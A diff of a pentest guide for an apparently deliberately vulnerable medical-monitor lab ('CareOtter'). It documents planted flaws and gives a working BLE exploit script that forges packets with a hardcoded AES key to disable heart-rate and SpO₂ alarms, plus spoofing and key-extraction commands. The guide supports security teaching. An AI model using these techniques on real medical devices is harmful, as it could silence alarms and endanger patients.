@@ -27,7 +27,7 @@
 
 ## Intentional Vulnerabilities
 
-The source code explicitly documents five vulnerabilities via inline comments:
+The source code explicitly documents six vulnerabilities. **VULN #6 is intentionally hidden** — it is not visible in the normal UI and must be discovered through pentesting.
 
 | # | Type | Location | Description |
 |---|------|----------|-------------|
@@ -36,6 +36,7 @@ The source code explicitly documents five vulnerabilities via inline comments:
 | 3 | **Plaintext external storage logging** | `VitalsLogger` | All BPM/SpO₂ readings are appended to `/sdcard/careotter_vitals.log` in cleartext. |
 | 4 | **Hardcoded thresholds** | `MainActivity.DEFAULT_THRESHOLDS` | Default clinical thresholds (`bpm_min=40`, `bpm_max=120`, `spo2_min=90`) are visible via static analysis / APK decompilation. |
 | 5 | **Unencrypted BLE channel** | `BleMonitorClient` | No LE Secure Connections, no encryption, no MITM protection. Data travels in plaintext over 2.4 GHz. |
+| 6 | **Hidden diagnostic panel** | `MainActivity` (hidden) | A secret threshold write panel is locked behind a gesture. Not visible in normal app use — must be discovered via static analysis or BLE enumeration. |
 
 ---
 
@@ -43,19 +44,55 @@ The source code explicitly documents five vulnerabilities via inline comments:
 
 ### 1. BLE Spoofing & Impersonation
 
-| Test | Tool / Method | Expected Result |
-|------|---------------|-----------------|
-| **Rogue device spoofing** | Second Raspberry Pi, ESP32, or Bettercap broadcasting the name `CareOtter_HR` with identical GATT service UUIDs. | The app auto-connects to the attacker-controlled device without requesting pairing or verifying the MAC address. Confirms **VULN #1**. |
-| **Passive BLE sniffing** | Ubertooth One, nRF Sniffer, or rooted Android with `btmon` / HCI snoop. | Captured GATT notifications reveal BPM and SpO₂ values in plaintext. Confirms **VULN #5**. |
-| **Characteristic cloning** | The rogue peripheral responds to reads/writes on `ALERT_THRESHOLD` (0xFF01) with attacker-controlled values. | The app accepts spoofed threshold data as legitimate because there is no signature or authenticity check. |
+| Test                       | Tool / Method                                                                                                    | Expected Result                                                                                                                        |
+| -------------------------- | ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
+| **Rogue device spoofing**  | Second Raspberry Pi, ESP32, or Bettercap broadcasting the name `CareOtter_HR` with identical GATT service UUIDs. | The app auto-connects to the attacker-controlled device without requesting pairing or verifying the MAC address. Confirms **VULN #1**. |
+| **Passive BLE sniffing**   | Ubertooth One, nRF Sniffer, or rooted Android with `btmon` / HCI snoop.                                          | Captured GATT notifications reveal BPM and SpO₂ values in plaintext. Confirms **VULN #5**.                                             |
+| **Characteristic cloning** | The rogue peripheral responds to reads/writes on `ALERT_THRESHOLD` (0xFF01) with attacker-controlled values.     | The app accepts spoofed threshold data as legitimate because there is no signature or authenticity check.                              |
 
 ### 2. Medical Data Injection
 
 | Test | Tool / Method | Expected Result |
 |------|---------------|-----------------|
 | **Vitals falsification** | Rogue device sends HR notifications with BPM = 0, BPM = 250, or SpO₂ = 0. | The app displays critical values and triggers the local alert banner, proving an attacker can inject clinical panic. |
-| **Malicious threshold manipulation** | In the app UI, edit the JSON threshold field to `{"bpm_min":0,"bpm_max":300,"spo2_min":0}` and tap *Write Threshold*. | The raw JSON is sent unvalidated to the DAI (**VULN #2**). If accepted by `ble_server.py`, life-saving alerts are effectively disabled (*therapeutic suppression*). |
-| **BLE fuzzing** | Use *nRF Connect* or a custom GATT client to write malformed payloads (e.g., `AAAA`, `<script>`, null bytes, oversized buffers) to `0xFF01`. | Observe whether `ble_server.py` crashes, throws a D-Bus exception, or writes garbage to `/tmp/careotter.thresholds`. |
+| **Malicious threshold manipulation via hidden panel** | Discover and unlock the diagnostic panel (see §6 below), then edit JSON to `{"bpm_min":0,"bpm_max":300,"spo2_min":0}` and tap *Write Threshold*. | The raw JSON is sent unvalidated to the DAI (**VULN #2**). Life-saving alerts are effectively disabled (*therapeutic suppression*). |
+| **Malicious threshold manipulation via BLE** | Use *nRF Connect* or a custom GATT client to write directly to `ALERT_THRESHOLD` (0xFF01) without using the app UI. | The characteristic is writable without pairing. Confirms that the attack surface exists independently of the hidden UI panel. |
+| **BLE fuzzing** | Write malformed payloads (e.g., `AAAA`, `<script>`, null bytes, oversized buffers) to `0xFF01`. | Observe whether `ble_server.py` crashes, throws a D-Bus exception, or writes garbage to `/tmp/careotter.thresholds`. |
+
+### 6. Hidden Diagnostic Panel Discovery
+
+The threshold read/write controls are **not visible** in the normal app UI. They are concealed in a hidden panel (`diagnosticPanel`, `android:visibility="gone"`) unlocked by a secret gesture.
+
+**Discovery path A — Static analysis (JADX / apktool)**
+
+1. Decompile the APK: `jadx careotter_app.apk -d output/`
+2. In `MainActivity`, search for `diagTapCount` or `DIAG_TAP_TARGET`.
+3. The decompiled source reveals a click listener on `tvTitle` that counts taps.
+4. 5 rapid taps within 3 seconds on the *CareOtter Monitor* title text → panel appears.
+
+```java
+// Decompiled fragment (VULN #6 evidence)
+private static final int DIAG_TAP_TARGET = 5;
+private static final long DIAG_TAP_WINDOW = 3000;
+tvTitle.setOnClickListener(v -> {
+    ...
+    if (diagTapCount >= DIAG_TAP_TARGET) {
+        diagnosticPanel.setVisibility(View.VISIBLE);
+    }
+});
+```
+
+**Discovery path B — BLE characteristic enumeration**
+
+1. Connect *nRF Connect* to the `CareOtter_HR` peripheral.
+2. Enumerate services: find `Alert Service` (0xFF00) → `Alert Threshold` (0xFF01).
+3. The characteristic has `WRITE` property with no authentication requirement.
+4. Write arbitrary JSON directly — app UI is bypassed entirely.
+
+**Expected findings**
+- `DEFAULT_THRESHOLDS = {"bpm_min":40,"bpm_max":120,"spo2_min":90}` hardcoded in source (**VULN #4**).
+- Written value goes to device unvalidated (**VULN #2**).
+- Threshold values affect local alert logic in real-time.
 
 ### 3. Data Exfiltration & Privacy
 
@@ -69,7 +106,7 @@ The source code explicitly documents five vulnerabilities via inline comments:
 
 | Test | Tool / Method | Expected Result |
 |------|---------------|-----------------|
-| **Forced disconnection** | 2.4 GHz jamming (Wi-Fi flood on BLE-adjacent channels) or scripted GATT disconnect from the rogue device. | The app shows "Desconectado" and stops receiving vitals. There is **no HTTP fallback**, so monitoring ceases entirely. |
+| **Forced disconnection** | 2.4 GHz jamming (Wi-Fi flood on BLE-adjacent channels) or scripted GATT disconnect from the rogue device. | The app shows "Disconnected" and stops receiving vitals. There is **no HTTP fallback**, so monitoring ceases entirely. |
 | **Notification flooding** | Rogue device sends 100+ HR notifications per second. | The UI saturates and `VitalsLogger` writes aggressively to disk, potentially exhausting external storage. |
 
 ### 5. Permission & Privacy Misconfiguration
@@ -103,3 +140,288 @@ The following attack vectors **do not apply** to `careotter_app` because the cor
 4. **Static analysis** exposing hardcoded clinical thresholds and service UUIDs.
 
 To extend testing into the **Wi-Fi / IGP v4** or **Cloud API** attack surfaces, use the **`careotter_admin`** application or attack the **Flask Cloud API** directly.
+
+# Pentest Guide
+
+## M1: Improper Credential Usage — CSCP v1 Hardcoded Key
+
+> **OWASP Mobile Top 10 2024 — M1: Improper Credential Usage**
+
+> **DEFINITION:** 
+
+### Problem Description
+
+The CSCP v1 protocol (CareOtter Secure Config Protocol) uses AES-128-ECB to "protect" clinical threshold writes to `0xFF01`. The master key is embedded in plaintext in two distributed artifacts:
+
+**Device firmware (`ble_server.py`):**
+```python
+# VULNERABILITY: hardcoded symmetric key — identical across all CareOtter devices
+CSCP_KEY   = b"careotter-key-16"   # 16 bytes AES-128
+CSCP_MAGIC = 0xCAFE0DDA
+```
+
+**Android APK (`CareOtterConfig.java`):**
+```java
+// VULNERABILITY: hardcoded AES key — identical across all CareOtter devices
+private static final byte[] CSCP_KEY = "careotter-key-16".getBytes(StandardCharsets.UTF_8);
+```
+
+### Key Extraction
+
+```bash
+# From the APK
+strings careotter_app.apk | grep -i careotter
+# → careotter-key-16
+
+# With jadx (full static analysis)
+jadx careotter_app.apk -d output/
+grep -r "CSCP_KEY" output/
+# → private static final byte[] CSCP_KEY = "careotter-key-16".getBytes(...)
+
+# From the firmware
+strings ble_server.py | grep "key-"
+# → careotter-key-16
+```
+### Why It Happens
+
+| Cause                          | Description                                                                                                                                                                                      |
+| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **Implementation convenience** | No PKI infrastructure or session management is required. A simple `CSCP_KEY = b"..."` is enough for the protocol to "work."                                                                      |
+| **False sense of security**    | "The data is encrypted in transit, therefore it is secure." The mistake is confusing *confidentiality in transit* with *authentication*. If the key is public, encryption only hides the format. |
+| **Firmware reuse**             | The same binary is flashed across all devices in the fleet. Compromise of one APK or one device = compromise of the entire hospital fleet.                                                       |
+
+### M1 Attack Chain
+
+```
+1. Obtain APK (Play Store / sideload)
+         │
+         ▼
+2. strings careotter_app.apk | grep careotter
+   → CSCP_KEY = "careotter-key-16"
+         │
+         ▼
+3. Implement forge_packet(bpm_min=0, bpm_max=255, spo2_min=0)
+   [AES-128-ECB + CRC32 + Magic 0xCAFE0DDA]
+         │
+         ▼
+4. BLE scan → find CareOtter_HR (no pairing required)
+         │
+         ▼
+5. write_gatt_char(0xFF01, packet)
+         │
+         ▼
+6. Device updates thresholds → ALL alerts suppressed
+   Patient in cardiac arrest (BPM=0) triggers no alert
+```
+
+### Root Cause
+
+The universal key `careotter-key-16` is identical across all CareOtter devices. Remediation requires: (1) unique per-device keys generated at manufacturing time in a TPM/secure element, (2) Android Keystore for key handling in the APK, and (3) removing the shared master-key model in favor of BLE LE Secure Connections with per-device certificates.
+
+---
+
+## M3: Overwrite Thresholds — Encryption as False Authentication
+
+> **OWASP Mobile Top 10 2024 — M3: Insecure Authentication/Authorization** (primary)
+> **+ M1: Improper Credential Usage** (prerequisite)
+> **+ M4: Insufficient Input/Output Validation** (secondary)
+
+### Problem Description
+
+The `ALERT_THRESHOLD` characteristic (UUID `0000ff01-0000-1000-8000-00805f9b34fb`) accepts writes from any BLE client without pairing, without GATT authentication, and without source verification.
+
+The vendor introduced CSCP v1 as a "military-grade security" measure — but the protocol has a fundamental flaw:
+
+> **If the attacker knows the key (hardcoded in firmware and APK), CSCP v1 stops being an authorization barrier and becomes a trivial serialization format.**
+
+The server validates: 24-byte size ✓ · Magic `0xCAFE0DDA` ✓ · CRC32 ✓ · AES decryption ✓
+
+It does not validate: who sent the packet? ✗ · authenticated/paired client? ✗ · clinically plausible values? ✗
+
+**CSCP v1 packet structure (24 bytes, big-endian):**
+
+| Offset | Size | Field   | Description |
+|--------|--------|---------|-------------|
+| `0x00` | 4      | Magic   | `0xCAFE0DDA` |
+| `0x04` | 4      | CRC32   | `crc32(ciphertext)` |
+| `0x08` | 16     | Payload | AES-128-ECB(`bpm_min‖bpm_max‖spo2_min‖0x00×13`) |
+
+### Exploitation
+
+The attack runs from Kali Linux using `bleak` and `pycryptodome`, with no physical access and without using the mobile app:
+
+```python
+import asyncio, struct, binascii
+from bleak import BleakClient, BleakScanner
+from Crypto.Cipher import AES
+
+THRESHOLD_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"
+CSCP_KEY       = b"careotter-key-16"   # extracted from APK with strings/jadx
+CSCP_MAGIC     = 0xCAFE0DDA
+
+def forge_packet(bpm_min, bpm_max, spo2_min):
+    pt  = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
+    ct  = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(pt)
+    crc = binascii.crc32(ct) & 0xFFFFFFFF
+    return struct.pack(">II", CSCP_MAGIC, crc) + ct
+
+async def main():
+    device = await BleakScanner.find_device_by_name("CareOtter_HR", timeout=10.0)
+    async with BleakClient(device) as c:
+        payload = forge_packet(0, 255, 0)   # suppress all clinical alerts
+        await c.write_gatt_char(THRESHOLD_UUID, payload)
+        print("[+] CSCP v1 lethal thresholds written — alerts suppressed")
+
+asyncio.run(main())
+```
+
+The script extracts the key from the APK, forges a valid CSCP v1 packet with lethal thresholds, connects without pairing, and writes it to `0xFF01`. The device accepts it immediately.
+
+By analyzing the GATT attribute, you can identify that it is writable (WRITE property) and that the value handling follows the CSCP v1 format.
+![[initial_thresholds.png|300]]
+
+![[overwrite_thresholds.png]]
+
+![[thresholds_changed.png|500]]
+
+### Comparison: Without CSCP v1 vs With CSCP v1
+
+| Aspect | Without CSCP v1 (legacy) | With CSCP v1 (current) |
+|---------|----------------------|----------------------|
+| Write format | Plain JSON | 24-byte AES-ECB packet |
+| Requirement to attack | Know UUID `0xFF01` | Know `CSCP_KEY` (extractable from APK) |
+| Session authentication | None | None |
+| Range validation | None | None |
+| Clinical impact | Identical | Identical |
+| Attack difficulty | Trivial | Trivial (once the key is extracted) |
+
+### Clinical and Security Implications
+
+| Impact | Details |
+|---------|---------|
+| **Alert suppression** | With `bpm_min=0`, `bpm_max=255`, `spo2_min=0`, no reading can trigger an alarm. A patient in cardiac arrest (BPM=0) or severe hypoxia (SpO₂=70%) generates no emergency notification. |
+| **Threshold falsification** | The attacker can set impossible thresholds to trigger constant false alarms, causing *alarm fatigue* for medical staff. |
+| **Persistence** | The modified thresholds remain active while `ble_server.py` is running. There is no automatic restoration mechanism or write audit log. |
+| **No forensic trace** | The BLE write leaves no record on the device. `/tmp/ble_connections.log` only records connections/disconnections, not characteristic writes. |
+| **Fleet-wide impact** | The same `CSCP_KEY` is embedded in every CareOtter device. A single APK extraction gives the attacker write access to the entire hospital fleet. |
+| **Range of impact** | The attack is possible from approximately 10 meters away without physical access or prior authentication, using standard hardware (a USB BLE adapter on Kali). |
+
+### Server-Side Payload Validation Analysis
+
+`AlertThresholdChrc.WriteValue()` in `ble_server.py` validates packet framing (magic, CRC, size) but applies thresholds without any clinical range check:
+
+```python
+@method()
+def WriteValue(self, value: "ay", options: "a{sv}"):
+    # VULNERABILITY (M3): no session authentication — any paired BLE client writes freely
+    # VULNERABILITY (M1): key extracted from firmware/APK breaks "encryption" barrier
+    raw = bytes(value)
+    thresholds = self._decrypt_and_unpack(raw)
+    if thresholds is None:
+        print(f"[BLE] CSCP v1 WriteValue: rejected (bad magic/CRC/size) {raw.hex()}")
+        return
+    # VULNERABILITY: no clinical range validation — bpm_min=0, bpm_max=255, spo2_min=0 accepted
+    alert_thresholds["bpm_min"]  = thresholds["bpm_min"]
+    alert_thresholds["bpm_max"]  = thresholds["bpm_max"]
+    alert_thresholds["spo2_min"] = thresholds["spo2_min"]
+```
+
+Server behavior for different payloads:
+
+| Packet sent                                                                 | Magic | CRC | Size     | Result                                     |
+| --------------------------------------------------------------------------- | ----- | --- | -------- | ------------------------------------------ |
+| Forged CSCP v1 with lethal values (`0, 255, 0`)                             | ✓     | ✓   | 24       | **Thresholds updated — alerts suppressed** |
+| CSCP v1 with partial values (`bpm_min=50` only possible via direct forging) | ✓     | ✓   | 24       | **All fields updated** (3 plaintext bytes) |
+| Incorrect magic                                                             | ✗     | —   | 24       | Silently rejected                          |
+| Incorrect CRC                                                               | ✓     | ✗   | 24       | Silently rejected                          |
+| Incorrect size (≠24)                                                        | —     | —   | —        | Silently rejected                          |
+| Plain JSON (`{"bpm_min":0,...}`)                                            | ✗     | —   | variable | Rejected (magic mismatch)                  |
+
+**Key finding**: CSCP v1 provides packet integrity validation (magic + CRC) but zero session authentication and zero medical range validation. The hardcoded key turns "encryption" into a format filter, not a security barrier.
+
+### Root Cause
+
+Remediation requires: (1) BLE LE Secure Connections with authenticated pairing before allowing writes to `0xFF01`, (2) clinical range validation (`0 < bpm_min < bpm_max < 250`, `50 < spo2_min < 100`), (3) per-device keys instead of a universal master key, and (4) logging every write with client MAC address in `/tmp/ble_connections.log`.
+
+## M4: Insufficient Input/Output Validation
+
+### Description
+The mobile app does not allow manual selection of the target device. It implements a *“Scan and Connect”* button that automatically selects the first BLE peripheral whose advertising name matches `CareOtter_HR`. 
+
+The BLE device name is **untrusted input** that comes from the environment (advertising packets broadcast by any transmitter in the air). The app treats it as a legitimate identifier without validation:
+
+- **Does not verify service UUIDs:** Any device can advertise the name `CareOtter_HR` without implementing the `0x180D` (Heart Rate) or `0x1822` (SpO2) services.
+- **Does not verify the MAC address:** Connects to the first device that appears, without a prior bonding whitelist or comparison with historically paired devices.
+- **Does not validate manufacturer data:** The advertising packet contains fields for manufacturer data (Company ID) that are also not checked.
+
+### Impact
+An attacker can deploy a **rogue BLE device** (USB dongle, Raspberry Pi, or even a smartphone running nRF Connect in *Advertiser* mode) that impersonates the legitimate medical monitor. 
+
+Once the biomedical technician’s app connects to the rogue device:
+1. The attacker receives the hardcoded administrative credentials (`OtterMobile2026` via IGP, or the CSCP v1 key `careotter-key-16`).
+2. The attacker can log the patient’s vital signs in real time (HIPAA/GDPR privacy violation).
+3. The attacker can subsequently re-inject malicious thresholds into the real device (if they have the M1 credentials).
+4. In an advanced scenario, the rogue device can act as a **BLE-IP proxy** to pivot into the hospital network.
+
+### Attack Vector: BLE Spoofing + Man-in-the-Middle
+
+#### Step 1: Environment Reconnaissance
+Use `hcitool` or `bettercap` from Kali to identify the CareOtter’s legitimate MAC address and copy its advertising parameters:
+
+```bash
+# Passive scan to view the device's MAC address
+sudo hcitool lescan --duplicates
+# Sample output: 43:45:C0:00:1F:AC  CareOtter_HR
+```
+
+#### Step 2: Cloning the advertising
+Using any BLE interface (CSR 4.0 dongle, Raspberry Pi, nRF52840):
+```bash
+# Configurar el adaptador atacante con el mismo nombre y clase de dispositivo médico
+sudo hciconfig hci0 name "CareOtter_HR"
+sudo hciconfig hci0 class 0x7A0440  # Medical/Pulse Oximeter/Heart Rate Monitor
+sudo hciconfig hci0 leadv 0          # Start advertising
+```
+
+Or with Bettercap (which allows for complete cloning of advertising data):
+```bash
+sudo bettercap -eval "
+  set ble.device CareOtter_HR
+  ble.recon on
+  # Wait for the technician's app to connect to the rogue device
+"
+```
+#### Step 3: GATT Service Impersonation (Optional - Rogue Server)
+If the attacker wants to maintain the connection without raising suspicion, they can set up a minimal GATT server with the same UUIDs (0x180D, 0x1822, 0xFF00) that return simulated vital data. This keeps the app “running” while the admin credentials are intercepted.
+
+#### Step 4: Credential Interception
+When the app attempts to authenticate against the rogue device (for example, by sending the OtterMobile2026 token via the IGP protocol encapsulated in BLE, or the CSCP v1 key to modify thresholds), the attacker captures:
+
+- The AES key `careotter-key-16` (if the app sends it in a handshake).
+- The CSCP v1 packets that the app constructs (reversible with the hardcoded key extracted from the APK).
+- The maintenance credentials `careotter` / `svc_maint_2024!` if the app opens an administration channel.
+
+### Evidence in nRF Connect
+From the attacker's perspective, evidence of spoofing is visible in the Advertiser tab of nRF Connect:
+
+| Campo Advertising       | Legitimate Value                  | Rogue Value (Attacker)       |
+| ----------------------- | --------------------------------- | ---------------------------- |
+| **Complete Local Name** | `CareOtter_HR`                    | `CareOtter_HR` (cloned)      |
+| **MAC Address**         | `43:45:C0:00:1F:AC`               | `AA:BB:CC:11:22:33` (random) |
+| **Appearance**          | `0x0341` (Generic Pulse Oximeter) | `0x0341` (copied)            |
+| **Service UUIDs**       | `0x180D`, `0x1822`                | Empty or copied              |
+
+**Critical Note:** The CareOtter app does not inspect the table above. It only reads the Complete Local Name field.
+Relationship to Other Vulnerabilities (Kill Chain)
+This M4 vulnerability acts as an entry point that enables the rest of the attack:
+
+1. **M4 (Input Validation)** → The app connects to the rogue device using a spoofed name.
+2. **M1 (Improper Credentials)** → The app leaks the CSCP v1 key (careotter-key-16) or the IGP token (OtterMobile2026) to the attacker.
+3. **M3 (Insecure Auth/AuthZ)** → The attacker uses these stolen credentials to connect to the REAL medical device and modify lethal thresholds via 0xFF01.
+
+Without the M4 flaw, the attacker would need physical compromise of the device or prior reverse engineering of the APK. M4 enables a remote and passive attack (requiring only a BLE dongle in the same room).
+### Escalation Variants
+#### A. Denial of Service (Medical DoS)
+The attacker does not need to set up a full rogue server. They simply broadcast CareOtter_HR with a stronger signal than the legitimate Raspberry Pi. The technician’s app will connect to the attacker rather than the actual device. If the attacker does not respond, the app freezes and the patient monitor fails to report vital signs.
+#### B. Downgrade Attack
+The rogue device broadcasts CareOtter_HR but with an older firmware version in the Manufacturer Specific Data. If the app has downgrade logic (CareOtter does not, but this is a common pattern in IoMT), it could force the installation of vulnerable firmware.
